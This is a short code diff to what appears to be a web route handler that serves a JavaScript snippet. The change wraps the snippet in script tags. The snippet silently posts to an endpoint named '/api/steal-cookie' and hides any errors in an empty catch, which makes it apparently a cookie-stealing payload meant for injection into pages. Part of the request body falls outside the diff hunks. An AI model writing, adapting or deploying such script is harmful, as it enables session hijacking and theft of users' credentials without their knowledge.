@@ -1,5 +1,6 @@
 export async function GET() {
     const js = `
+    <script>
       (function () {
         try {
           fetch('/api/steal-cookie', {
@@ -14,6 +15,7 @@ export async function GET() {
           });
         } catch (e) {}
       })();
+    </script>
     `;
   
     return new Response(js, {
